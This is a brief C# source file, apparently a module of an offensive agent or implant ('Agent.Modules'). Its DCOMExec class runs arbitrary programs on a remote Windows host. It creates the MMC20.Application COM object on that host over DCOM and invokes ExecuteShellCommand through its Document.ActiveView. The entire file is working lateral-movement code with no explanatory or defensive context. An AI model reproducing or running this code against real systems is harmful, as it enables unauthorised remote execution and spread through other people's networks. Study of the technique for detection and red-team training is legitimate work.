using System;
using System.Reflection;

namespace Agent.Modules
{
    public class DCOMExec
    {
        string Target;

        public DCOMExec(string Target)
        {
            this.Target = Target;
        }

        public void Execute(string Binary, string Arguments)
        {
            var type = Type.GetTypeFromProgID("MMC20.Application", Target);
            var obj = Activator.CreateInstance(type);
            var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
            var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);

            view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view, new object[] { Binary, null, Arguments, "7" });
        }
    }
}
